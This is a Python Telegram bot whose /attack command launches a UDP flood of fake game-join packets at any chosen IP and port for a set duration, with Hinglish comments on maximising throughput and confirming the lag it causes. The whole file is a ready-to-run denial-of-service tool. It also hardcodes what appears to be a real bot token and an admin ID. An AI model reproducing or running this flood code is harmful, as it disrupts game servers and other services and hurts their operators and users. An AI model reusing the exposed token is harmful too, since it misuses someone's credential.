import logging
import socket
import time
import random
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ==================== BOT CONFIG ====================
BOT_TOKEN = "7149714912:AAFDri0PhxEQoHtv3nW-YEq115PVeMVrLrI"
ADMIN_ID = 5879540185

stop_flags = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 **Simple & Fast UDP Fake Flood** Ready\nPehle kernel tuning kar le!")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚔️ **Simple Attack**\n\n"
        "`/attack <ip> <port> <duration_seconds>`\n"
        "Example: `/attack 127.0.0.1 7777 30`\n\n"
        "/stopattack",
        parse_mode='Markdown'
    )

def udp_flood(ip, port, duration, stop_event):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32 * 1024 * 1024)  # 32MB buffer
        sock.setblocking(False)

        end_time = time.time() + duration
        payload = b"FAKE_GAME_JOIN_REQUEST_" + random.randbytes(600)  # ~650 bytes fixed

        packets = 0
        while time.time() < end_time and not stop_event.is_set():
            try:
                sock.sendto(payload, (ip, port))
                packets += 1
                # Bahut chhota pause sirf jab zaruri ho
                if packets % 10000 == 0:
                    time.sleep(0.000005)
            except BlockingIOError:
                time.sleep(0.0005)   # buffer full → thoda wait
            except:
                time.sleep(0.001)

        sock.close()
        logger.info(f"Flood ended. Approx packets: {packets}")
    except Exception as e:
        logger.error(f"Flood error: {e}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return

    if len(context.args) < 3:
        await update.message.reply_text(
            "Usage: `/attack <ip> <port> <duration_seconds>`\n"
            "Example: `/attack YOUR_GAME_IP 7777 45`",
            parse_mode='Markdown'
        )
        return

    ip = context.args[0]
    port = int(context.args[1])
    duration = int(context.args[2])

    attack_id = f"{ip}:{port}_{int(time.time())}"
    stop_event = asyncio.Event()  # Simple event
    stop_flags[attack_id] = stop_event

    msg = await update.message.reply_text(
        f"⚔️ **FAST UDP FLOOD STARTED**\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"⏱ Duration: `{duration}` seconds\n"
        f"Sending fake packets as fast as possible...",
        parse_mode='Markdown'
    )

    # Background mein flood chala do
    loop = asyncio.get_running_loop()
    await loop.run_in_executor(None, udp_flood, ip, port, duration, stop_event)

    await asyncio.sleep(duration)
    stop_event.set()

    await msg.edit_text(
        f"✅ **Flood Completed**\n"
        f"Target: `{ip}:{port}`\n"
        f"Duration: `{duration}s`\n\n"
        f"Ab server pe `iftop` ya game console check kar — traffic/lag dikhna chahiye"
    )

async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    for ev in stop_flags.values():
        ev.set()
    await update.message.reply_text("🛑 Flood stopped.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stopattack", stop_attack_cmd))

    print("🔥 Simple Fast UDP Flood Bot Started!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
